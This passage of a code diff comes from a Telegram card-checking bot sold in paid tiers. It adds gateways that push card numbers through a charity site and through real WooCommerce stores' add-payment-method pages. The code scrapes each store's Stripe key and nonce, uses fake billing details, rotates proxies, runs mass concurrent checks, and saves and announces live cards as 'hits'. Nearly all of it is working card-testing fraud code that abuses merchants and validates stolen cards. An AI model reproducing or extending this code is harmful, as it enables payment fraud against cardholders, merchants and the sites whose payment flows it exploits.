+                print(f"🔧 Formatted proxy: {mask_proxy(proxy_url)}")
+
+        start_time = time.time()
+
+        # Run the synchronous check in thread pool
+        loop = asyncio.get_event_loop()
+        raw_result = await loop.run_in_executor(
+            thread_pool,
+            _st1_process_card_sync,
+            cc, mm, yy, cvv, proxy_url
+        )
+
+        elapsed = time.time() - start_time
+        
+        # Map the result
+        status, message, code = _st1_map_result(raw_result)
+
+        print(f"📊 [ST1 GATEWAY] Status: {status}, Message: {message}, Code: {code}")
+
+        # Determine status display
+        if status == "charged":
+            status_display = "🔥 CHARGED 🔥"
+            status_category = "charged"
+        elif status == "approved":
+            # Check message for specific types
+            msg_lower = message.lower()
+            if "insufficient" in msg_lower or "funds" in msg_lower:
+                status_display = "💰 INSUFFICIENT FUNDS"
+            elif "cvv" in msg_lower or "security" in msg_lower:
+                status_display = "✅ CVV LIVE"
+            else:
+                status_display = "✅ APPROVED"
+            status_category = "approved"
+        elif status == "declined":
+            status_display = "❌ DECLINED"
+            status_category = "declined"
+        else:
+            status_display = "⚠️ ERROR"
+            status_category = "error"
+
+        return {
+            "status": "success" if status in ["charged", "approved", "declined"] else "error",
+            "result": status,
+            "message": message,
+            "code": code,
+            "status_display": status_display,
+            "status_category": status_category,
+            "elapsed": elapsed,
+            "price": "$0.00",
+            "gateway": "ST1 Gateway",
+            "proxy_used": proxy
+        }
+
+    except Exception as e:
+        print(f"❌ [ST1 GATEWAY] Error: {e}")
+        import traceback
+        traceback.print_exc()
+        default_result["message"] = str(e)[:100]
+        return default_result
+
+
+def format_st1_gateway_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format ST1 Gateway response for display with premium emojis"""
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "ST1 Gateway")
+    price = result.get("price", "$0.00")
+    code = result.get("code", "")
+
+    # Parse card for display
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+
+    # Clean message
+    clean_message = message[:80]
+    if len(message) > 80:
+        clean_message += "..."
+
+    # Format country with flag
+    country_name = country.replace('🌐', '').strip()
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+
+    # Format bank name
+    bank_display = bank if bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+
+    # Determine emoji based on status
+    if status_category == "charged":
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif status_category == "approved":
+        if "INSUFFICIENT" in message.upper():
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+            status_text = "INSUFFICIENT FUNDS"
+        elif "CVV" in message.upper():
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+            status_text = "CVV LIVE"
+        else:
+            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+            status_text = "APPROVED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+
+    # Build output
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+    )
+
+    return ui, status_category
+
+
+# ============ ST1 GATEWAY COMMAND HANDLERS ============
+
+@check_gateway("st1_gateway")
+async def single_check_st1_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Single card check with ST1 Gateway - /st <card>
+    """
+    if not await verify_group_access(update, context):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>ST1 Gateway (forcesforchange.org)</b>\n\n"
+            "Usage: <code>/st &lt;card&gt;</code>\n"
+            "Example: <code>/st 4111111111111111|12|2028|123</code>\n\n"
+            "💰 Amount: $0.00 (Auth Check)\n"
+            "📍 Gateway: Stripe via forcesforchange.org\n"
+            "✅ Checks: Charged, CVV Live, Insufficient Funds, 3D Secure",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+
+    # Extract card
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4111111111111111|12|2028|123"
+        )
+        return
+
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        error_message = (
+            f"❌ <b>ST1 Gateway not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+        add_user_credits(user_id, 1)
+        return
+
+    st1_gateway_active_tasks[user_id] = True
+
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+
+        status_msg = await message.reply_text("🔄 Checking card with ST1 Gateway...")
+
+        await speed_controller.wait_if_needed()
+        start = time.time()
+
+        # Get proxy if allowed
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 [ST1] Using proxy: {mask_proxy(proxy_str)}")
+
+        result = await check_card_st1_gateway(card, proxy_str, user_id)
+
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+
+        bin_info = await get_bin_info(card)
+
+        try:
+            await status_msg.delete()
+        except:
+            pass
+
+        ui, status_category = format_st1_gateway_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway="ST1 Gateway",
+                response=result.get("message", "Approved"),
+                price="$0.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="ST1 Gateway", card=card,
+                    response=result.get("message", "Charged"),
+                    price="$0.00",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+
+        user_manager.increment_checks(user_id)
+
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [ST1 Gateway] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        st1_gateway_active_tasks.pop(user_id, None)
+
+
+async def st1_gateway_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """
+    Mass check logic for ST1 Gateway
+    """
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+
+    print(f"\n{'='*80}")
+    print(f"🚀 [ST1 GATEWAY MASS CHECK] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+
+    # Get user's working proxies
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
+
+    stats = {
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+
+    start_time = time.time()
+    proxy_index = 0
+
+    try:
+        st1_gateway_active_tasks[u_id] = True
+
+        tier = user_manager.get_tier(u_id)
+
+        CONCURRENCY = {
+            "free": 2,
+            "premium": 5,
+            "ultimate": 10,
+            "admin": 10,
+        }.get(tier, 2)
+
+        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ ST1 Gateway\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 10 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+
+            progress_text = (
+                f"<b>Gateway</b> ➛ ST1 Gateway\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except Exception as e:
+                if "message is not modified" not in str(e).lower():
+                    print(f"⚠️ Progress update error: {e}")
+
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+
+            async with semaphore:
+                await speed_controller.wait_if_needed()
+                start = time.time()
+
+                # Get proxy for this card
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+
+                result = await check_card_st1_gateway(card, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+
+                bin_info = await get_bin_info(card)
+
+                status_category = result.get("status_category", "unknown")
+
+                async with stats_lock:
+                    processed_count += 1
+
+                    if status_category == "charged":
+                        stats["charged"] += 1
+                        stats["approved"] += 1
+                        print(f"🔥 [CHARGED] {card[:20]}...")
+                    elif status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
+                    else:
+                        stats["errors"] += 1
+                        print(f"⚠️ [ERROR] {card[:20]}...")
+
+                    if processed_count % 10 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+
+                # ONLY SEND RESULT FOR CHARGED OR APPROVED CARDS
+                if status_category in ["charged", "approved"]:
+                    ui, _ = format_st1_gateway_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except Exception as e:
+                        print(f"❌ Error sending result: {e}")
+
+                    await save_hit_to_file(
+                        card=card, gateway="ST1 Gateway",
+                        response=result.get("message", "Approved"),
+                        price="$0.00",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+
+                    if status_category == "charged":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway="ST1 Gateway", card=card,
+                            response=result.get("message", "Charged"),
+                            price="$0.00",
+                            user=user_data, bin_info=bin_info, status_category="charged"
+                        )
+                        user_manager.increment_hits(u_id)
+
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+
+        # Process all cards
+        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
+
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in st1_gateway_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ Task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+
+        if u_id in st1_gateway_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+
+            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+
+            summary = (
+                f"{skull_emoji} <b>ST1 Gateway Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            print(f"📊 Final summary sent to user {u_id}")
+
+        return stats
+
+    except Exception as e:
+        print(f"❌ ST1 Gateway mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+            else:
+                await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        st1_gateway_active_tasks.pop(u_id, None)
+        print(f"🏁 [ST1 Gateway Mass] Session ended for user {u_id}")
+
+
+@check_gateway("st1_gateway")
+async def mass_check_st1_gateway_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Mass card check with ST1 Gateway - /mst <cards>
+    """
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    if user_id in st1_gateway_active_tasks:
+        await message.reply_text(
+            "⚠️ You already have an active ST1 Gateway session.\n"
+            "Please wait for it to finish or use /stop to cancel.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ ST1 Gateway not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use /st for single checks.\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # Check if reply to file
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+
+            await message.delete()
+            await st1_gateway_mass_check_logic(update, context, cards, None)
+            return
+
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>ST1 Gateway Mass Check</b>\n\n"
+            "Usage: <code>/mst &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mst\n\n"
+            "Example: <code>/mst 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $0.00 (Auth Check)\n"
+            "📍 Gateway: Stripe via forcesforchange.org\n"
+            "✅ Only charged/approved cards will be shown\n"
+            "❌ Declined cards are hidden from chat",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+
+    # Check batch size limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+
+    # Check credits for mass check (1 credit per card for free users)
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        await message.delete()
+    except:
+        pass
+
+    await st1_gateway_mass_check_logic(update, context, cards, None)      
         
 # ============ ADYEN GATEWAY (Picsart) - FIXED ============
 # Add this after your other gateway configurations
@@ -28467,7 +29641,7 @@ async def quick_command_handler(update: Update, context: ContextTypes.DEFAULT_TY
         await update.message.reply_text("✅ Switched to <b>Braintree</b>", parse_mode=ParseMode.HTML)
         return True
     
-    elif cmd == 'au':
+    elif cmd == 'msh':
         if not user_manager.can_access_gateway(user_id, 'autosopi'):
             await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
             return True
@@ -34316,7 +35490,7 @@ async def global_mode_status_command(update: Update, context: ContextTypes.DEFAU
     
     if GLOBAL_PROXY_ONLY_MODE:
         msg += f"📌 <b>Affected Gateways:</b>\n"
-        msg += f"   • /aumc - Global only\n"
+        msg += f"   • /msh - Global only\n"
         msg += f"   • /sh - Global only\n\n"
         msg += f"📊 <b>Global Pool:</b>\n"
         msg += f"   • Enabled: {'✅' if global_proxy_pool.enabled else '❌'}\n"
@@ -39483,6 +40657,914 @@ async def send_gif_with_result(
             # Last resort: send text only
             await message.reply_text(result_text, parse_mode=ParseMode.HTML)
             
+            
+# ============ STRIPE AUTH GATEWAY (WOOCOMMERCE ADD-PAYMENT-METHOD) ============
+# From chk.py - Stripe Auth gate for WooCommerce add-payment-method
+
+import json
+import random
+import re
+import uuid
+import requests
+from typing import Dict, Tuple, Optional, List
+import asyncio
+import traceback
+from datetime import datetime
+
+# Active tasks for Stripe Auth (chk)
+stripe_auth_chk_active_tasks = {}
+
+# ============ CONFIGURATION ============
+CHK_REQUEST_TIMEOUT = 15
+
+CHK_SITES = [
+    "https://www.oliveadot.com",
+    "https://dice-heads.com",
+]
+
+CCN_WRONG_REGEX = [re.compile(p, re.I) for p in (
+    r"incorrect[_ ]cvc", r"cvc[_ ]check:\s*fail", r"invalid[_ ]cvc",
+    r"cvv[_ ]decline", r"declined[_ ]cvv", r"wrong[_ ]cvc", r"cvc[_ ]failure",
+    r"cvv[_ ]check:\s*incorrect", r"card's security code is incorrect",
+    r"the cvc code is incorrect", r"cvc mismatch", r"security code incorrect",
+    r"cvc does not match", r"security code is invalid", r"invalid security code",
+)]
+
+CVV_APPROVED_REGEX = [re.compile(p, re.I) for p in (
+    r"succeeded", r"success", r"payment method added", r"authorized", r"approved",
+    r"completed", r"processed", r"payment successful", r"added successfully",
+    r"card added successfully", r"payment method added successfully",
+)]
+
+_BILLING = [
+    {"postcode": "1000", "country": "PH"},
+    {"postcode": "1100", "country": "PH"},
+    {"postcode": "1200", "country": "PH"},
+    {"postcode": "1600", "country": "PH"},
+    {"postcode": "6000", "country": "PH"},
+]
+
+_CHK_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+)
+
+# ============ HELPER FUNCTIONS ============
+
+def _parse_between(data, start, end):
+    try:
+        i = data.index(start) + len(start)
+        return data[i:data.index(end, i)]
+    except (ValueError, IndexError):
+        return None
+
+
+def _extract_pk(html):
+    if not html:
+        return None
+    for pat in (r"pk_live_[A-Za-z0-9]{24,}", r"pk_test_[A-Za-z0-9]{24,}", r"pk_(?:live|test)_[A-Za-z0-9_]+"):
+        m = re.search(pat, html)
+        if m:
+            return m.group(0)
+    return None
+
+
+def _detect_status(msg):
+    if not msg:
+        return "DECLINED"
+    for p in CVV_APPROVED_REGEX:
+        if p.search(msg):
+            return "CVV_APPROVED"
+    for p in CCN_WRONG_REGEX:
+        if p.search(msg):
+            return "CCN_APPROVED"
+    return "DECLINED"
+
+
+def _is_card_response(msg):
+    if _detect_status(msg) != "DECLINED":
+        return True
+    ml = msg.lower()
+    return any(k in ml for k in (
+        "card", "invalid", "declined", "insufficient", "expired", "cvc",
+        "security", "incorrect", "wrong", "fraud", "stolen", "restricted",
+        "honor", "limit",
+    ))
+
+
+def _check_on_site(site_url, cc, mm, yy, cvv):
+    """Check card on a single site"""
+    session = requests.Session()
+    billing = random.choice(_BILLING)
+    headers = {
+        "User-Agent": _CHK_UA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+    }
+
+    page = session.get(
+        f"{site_url}/my-account/add-payment-method/",
+        headers=headers,
+        timeout=CHK_REQUEST_TIMEOUT,
+    )
+    if page.status_code != 200:
+        return "error", f"HTTP {page.status_code}", "site_error"
+
+    pk = _extract_pk(page.text)
+    if not pk:
+        return "error", "Stripe PK not found", "site_error"
+
+    nonce = _parse_between(page.text, '"createAndConfirmSetupIntentNonce":"', '"')
+    if not nonce:
+        m = re.search(
+            r'woocommerce_tokenization_form_params = {.*?"nonce":"([^"]+)"',
+            page.text, re.DOTALL,
+        )
+        nonce = m.group(1) if m else None
+    if not nonce:
+        return "error", "Setup nonce not found", "site_error"
+
+    stripe_data = {
+        "type": "card",
+        "card[number]": cc,
+        "card[cvc]": cvv,
+        "card[exp_year]": yy,
+        "card[exp_month]": mm,
+        "allow_redisplay": "unspecified",
+        "billing_details[address][postal_code]": billing["postcode"],
+        "billing_details[address][country]": billing["country"],
+        "pasted_fields": "number",
+        "payment_user_agent": "stripe.js/41ba105bc6; stripe-js-v3/41ba105bc6; payment-element; deferred-intent&",
+        "referrer": site_url,
+        "time_on_page": str(random.randint(5000, 30000)),
+        "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
+        "client_attribution_metadata[merchant_integration_source]": "elements",
+        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
+        "client_attribution_metadata[merchant_integration_version]": "2021",
+        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
+        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
+        "client_attribution_metadata[elements_session_config_id]": str(uuid.uuid4()),
+        "guid": str(uuid.uuid4()),
+        "muid": str(uuid.uuid4()),
+        "sid": str(uuid.uuid4()),
+        "key": pk,
+        "_stripe_version": "2024-06-20",
+    }
+
+    stripe_resp = session.post(
+        "https://api.stripe.com/v1/payment_methods",
+        headers={
+            "accept": "application/json",
+            "content-type": "application/x-www-form-urlencoded",
+            "origin": "https://js.stripe.com",
+            "referer": "https://js.stripe.com/",
+            "user-agent": _CHK_UA,
+        },
+        data=stripe_data,
+        timeout=CHK_REQUEST_TIMEOUT,
+    )
+
+    try:
+        stripe_json = stripe_resp.json()
+    except json.JSONDecodeError:
+        return "error", "Invalid Stripe response", "site_error"
+
+    pm_id = stripe_json.get("id")
+    if not pm_id:
+        err = stripe_json.get("error", {}).get("message", "Unknown error")
+        if _detect_status(err) == "CCN_APPROVED":
+            return "ccn", err, "ccn"
+        if _is_card_response(err):
+            return "declined", err, "declined"
+        return "error", err, "site_error"
+
+    host = site_url.replace("https://", "").replace("http://", "").split("/")[0]
+    ajax_resp = session.post(
+        f"{site_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
+        headers={
+            "accept": "*/*",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "origin": site_url,
+            "referer": f"{site_url}/my-account/add-payment-method/",
+            "user-agent": _CHK_UA,
+            "x-requested-with": "XMLHttpRequest",
+            "authority": host,
+        },
+        data={
+            "action": "create_and_confirm_setup_intent",
+            "wc-stripe-payment-method": pm_id,
+            "wc-stripe-payment-type": "card",
+            "_ajax_nonce": nonce,
+        },
+        timeout=CHK_REQUEST_TIMEOUT,
+    )
+
+    try:
+        ajax_json = ajax_resp.json()
+    except json.JSONDecodeError:
+        return "error", "Invalid AJAX response", "site_error"
+
+    if ajax_json.get("success") and ajax_json.get("data", {}).get("status") == "succeeded":
+        return "approved", "Payment method added successfully", "cvv_approved"
+
+    msg = ajax_json.get("data", {}).get("error", {}).get("message", "Card declined")
+    if _detect_status(msg) == "CCN_APPROVED":
+        return "ccn", msg, "ccn"
+    if _is_card_response(msg):
+        return "declined", msg, "declined"
+    return "error", msg, "site_error"
+
+
+# ============ MAIN CHECK FUNCTION ============
+
+async def check_card_stripe_chk(card: str, proxy: str = None, user_id: int = None, max_retries: int = 4) -> Dict:
+    """
+    Check card using Stripe Auth WooCommerce gateway
+    Returns: Dict with status, message, etc.
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [STRIPE CHK] Checking card: {card[:20]}...")
+    if proxy:
+        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    else:
+        print(f"🔌 No proxy - direct connection")
+    print(f"{'='*80}")
+    
+    default_result = {
+        "status": "error",
+        "result": "UNKNOWN_ERROR",
+        "message": "Unknown error occurred",
+        "status_display": "⚠️ ERROR",
+        "status_category": "error",
+        "elapsed": 0,
+        "price": "$0.00",
+        "gateway": "Stripe Auth",
+        "site_used": ""
+    }
+    
+    try:
+        # Parse card
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error"
+            }
+        
+        cc, mm, yy, cvv = parts
+        cc = re.sub(r"\D", "", cc)
+        mm = mm.zfill(2)
+        if len(yy) == 2:
+            yy = "20" + yy[-2:]
+        
+        # Validate card format
+        if not (13 <= len(cc) <= 19 and 1 <= int(mm) <= 12 and 3 <= len(cvv) <= 4):
+            return {
+                "status": "error",
+                "result": "INVALID_CARD",
+                "message": "Invalid card details",
+                "status_display": "⚠️ INVALID CARD",
+                "status_category": "error"
+            }
+        
+        start_time = time.time()
+        
+        # Setup session with proxy if provided
+        session = requests.Session()
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                session.proxies = {'http': proxy_url, 'https': proxy_url}
+                print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
+        
+        # Try each site
+        attempted = set()
+        last_msg = "All sites failed"
+        last_code = "site_error"
+        
+        for attempt in range(max_retries):
+            site_url = random.choice(CHK_SITES)
+            n = 0
+            while site_url in attempted and n < len(CHK_SITES) * 2:
+                site_url = random.choice(CHK_SITES)
+                n += 1
+            attempted.add(site_url)
+            site_url = site_url.rstrip("/")
+            
+            print(f"📍 [Attempt {attempt + 1}/{max_retries}] Testing site: {site_url}")
+            
+            try:
+                # Run the synchronous check in thread pool
+                loop = asyncio.get_event_loop()
+                status, msg, code = await loop.run_in_executor(
+                    thread_pool,
+                    _check_on_site,
+                    site_url, cc, mm, yy, cvv
+                )
+                
+                if code != "site_error":
+                    elapsed = time.time() - start_time
+                    
+                    # Map status to our format
+                    if status == "approved":
+                        status_display = "✅ APPROVED"
+                        status_category = "approved"
+                        print(f"✅ APPROVED: {msg}")
+                    elif status == "ccn":
+                        status_display = "✅ CVV LIVE"
+                        status_category = "approved"
+                        print(f"✅ CVV LIVE: {msg}")
+                    elif status == "declined":
+                        status_display = "❌ DECLINED"
+                        status_category = "declined"
+                        print(f"❌ DECLINED: {msg}")
+                    else:
